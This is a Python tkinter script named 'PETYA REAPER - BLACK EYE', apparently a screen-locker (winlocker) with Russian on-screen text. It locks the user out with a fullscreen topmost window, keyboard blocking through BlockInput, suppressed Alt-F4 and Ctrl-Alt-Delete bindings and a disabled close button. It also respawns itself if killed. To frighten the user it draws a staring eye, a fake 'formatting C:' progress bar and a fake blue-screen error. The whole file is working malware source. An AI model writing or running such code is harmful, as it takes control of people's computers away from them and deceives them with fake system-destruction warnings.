import tkinter as tk
import random
import ctypes
import threading
import time
import subprocess
import sys
import os

# ============================================
# P E T Y A   R E A P E R   -   B L A C K   E Y E   (NO PIL)
# ============================================

W, H = None, None
format_percent = 0
bsod_mode = False
bsod_timer = 0
exe_path = sys.argv[0]

def block_keys():
    ctypes.windll.user32.BlockInput(True)

def unblock_keys():
    ctypes.windll.user32.BlockInput(False)

def self_replicate():
    while True:
        time.sleep(0.3)
        try:
            root.update()
        except:
            unblock_keys()
            subprocess.Popen([exe_path], shell=True)
            os._exit(0)

def draw_bsod(canvas):
    canvas.delete("all")
    canvas.create_rectangle(0, 0, W, H, fill="#0a2f6a", outline="")
    canvas.create_text(W//2, H//2 - 180, text=":(", fill="white", font=("Segoe UI", 160))
    canvas.create_text(W//2, H//2 - 20, text="КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ", fill="white", font=("Segoe UI", 36, "bold"))
    
    error = random.choice([
        "REAPER_SOUL_0xDEADBEEF",
        "EYE_OF_GOD_0x8BADF00D",
        "SOUL_EATER_0xDEADCODE"
    ])
    
    canvas.create_text(W//2, H//2 + 60, text=error, fill="#aaccff", font=("Consolas", 24, "bold"))
    canvas.create_text(W//2, H - 120, text="⚠️  ТЕБЯ ЗАМЕТИЛИ  ⚠️", fill="#ff6666", font=("Arial", 56, "bold"))

def glitch():
    global format_percent, bsod_mode, bsod_timer
    
    if bsod_mode:
        draw_bsod(canvas)
        root.after(200, glitch)
        return
    
    canvas.delete("all")
    canvas.create_rectangle(0, 0, W, H, fill="black", outline="")
    
    # Череп
    cx, cy = 200, 200
    canvas.create_oval(cx-70, cy-70, cx+70, cy+50, fill="black", outline="red", width=4)
    canvas.create_oval(cx-40, cy-40, cx-10, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx+10, cy-40, cx+40, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx-35, cy-35, cx-15, cy-15, fill="red", outline="yellow", width=2)
    canvas.create_oval(cx+15, cy-35, cx+35, cy-15, fill="red", outline="yellow", width=2)
    
    # ОГРОМНЫЙ ГЛАЗ ИЗ СИМВОЛОВ
    eye_x, eye_y = W//2, H//2
    eye_size = 40
    
    # Белок глаза
    canvas.create_oval(eye_x-150, eye_y-150, eye_x+150, eye_y+150, fill="white", outline="red", width=8)
    # Радужка
    canvas.create_oval(eye_x-80, eye_y-80, eye_x+80, eye_y+80, fill="darkred", outline="red", width=5)
    # Зрачок
    canvas.create_oval(eye_x-40, eye_y-40, eye_x+40, eye_y+40, fill="black", outline="white", width=3)
    # Блик
    canvas.create_oval(eye_x-20, eye_y-30, eye_x-5, eye_y-15, fill="white", outline="")
    canvas.create_oval(eye_x+5, eye_y-25, eye_x+20, eye_y-10, fill="white", outline="")
    
    # Кровеносные сосуды
    for i in range(30):
        x1 = eye_x + random.randint(-140, 140)
        y1 = eye_y + random.randint(-140, 140)
        x2 = eye_x + random.randint(-140, 140)
        y2 = eye_y + random.randint(-140, 140)
        canvas.create_line(x1, y1, x2, y2, fill="#8b0000", width=random.randint(1, 3))
    
    # ТЕБЯ ЗАМЕТИЛИ
    canvas.create_text(W//2, H//2 - 300, text="⚠️  ТЕБЯ ЗАМЕТИЛИ  ⚠️", fill="red", font=("Arial", 72, "bold"))
    
    # Винлокер
    cx_win, cy_win = W//2, H - 200
    canvas.create_rectangle(cx_win-300, cy_win-80, cx_win+300, cy_win+80, fill="#0a0a0a", outline="red", width=3)
    canvas.create_text(cx_win, cy_win-30, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill="red", font=("Arial", 28, "bold"))
    canvas.create_text(cx_win, cy_win+20, text=f"ФОРМАТИРОВАНИЕ: C:\\ [{int(format_percent)}%]", fill="white", font=("Courier", 20))
    
    # Прогресс-бар
    bar_x, bar_y = cx_win - 250, cy_win + 40
    canvas.create_rectangle(bar_x, bar_y, bar_x+500, bar_y+20, outline="gray", fill="#222")
    canvas.create_rectangle(bar_x, bar_y, bar_x+int(500*(format_percent/100)), bar_y+20, fill="red")
    
    # Маленькие глаза
    for _ in range(80):
        x = random.randint(0, W)
        y = random.randint(0, H)
        canvas.create_text(x, y, text=random.choice(["◉", "⬤", "@"]), fill="darkred", font=("Courier", random.randint(12, 24)))
    
    format_percent = min(100, format_percent + 0.5)
    bsod_timer += 0.2
    
    if bsod_timer > 15:
        bsod_mode = True
    
    ctypes.windll.kernel32.Beep(random.randint(100, 200), 30)
    root.after(100, glitch)

# ============================================
root = tk.Tk()
W, H = root.winfo_screenwidth(), root.winfo_screenheight()

root.attributes("-fullscreen", True, "-topmost", True)
root.configure(bg="black")
root.overrideredirect(True)

# БЛОКИРОВКА КЛАВИШ
root.bind("<Key>", lambda e: "break")
root.bind("<Escape>", lambda e: "break")
root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Control>", lambda e: "break")
root.bind("<Alt>", lambda e: "break")
root.bind("<F4>", lambda e: "break")
root.bind("<Alt-Tab>", lambda e: "break")
root.bind("<Control-Alt-Delete>", lambda e: "break")

root.protocol("WM_DELETE_WINDOW", lambda: None)

canvas = tk.Canvas(root, width=W, height=H, highlightthickness=0, bg="black")
canvas.pack()

try:
    block_keys()
except:
    pass

threading.Thread(target=self_replicate, daemon=True).start()

glitch()
root.mainloop()

try:
    unblock_keys()
except:
    pass